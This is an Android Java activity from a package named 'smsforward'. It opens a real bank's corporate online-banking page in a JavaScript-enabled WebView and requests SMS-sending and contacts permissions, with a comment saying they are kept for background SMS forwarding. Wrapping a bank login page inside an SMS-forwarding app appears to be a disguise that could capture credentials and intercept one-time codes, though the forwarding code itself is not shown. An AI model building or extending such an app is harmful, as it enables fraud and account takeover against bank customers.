package com.enixcoda.smsforward;

import android.Manifest;
import android.os.Bundle;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main); // Points to the modified activity_main.xml

        // Keep permission requests for background SMS forwarding & internet for WebView
        requestPermissions(new String[] {
                Manifest.permission.SEND_SMS,
                Manifest.permission.INTERNET,
                Manifest.permission.READ_CONTACTS
        }, 0);

        webView = findViewById(R.id.webview);
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true); // Enable JavaScript for website compatibility

        // Set a WebViewClient to make links open within the WebView itself
        webView.setWebViewClient(new WebViewClient());

        // *** IMPORTANT: Change this URL to the website of your choice ***
        String targetUrl = "https://corporate.bankofabyssinia.com/Corporate/servletcontroller"; // Replace with your desired URL
        webView.loadUrl(targetUrl);

        // The SettingsFragment is no longer loaded here
    }

    // Handle the back button to navigate within WebView history
    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    // The SettingsFragment inner class has been removed as it's not used by this modified MainActivity
}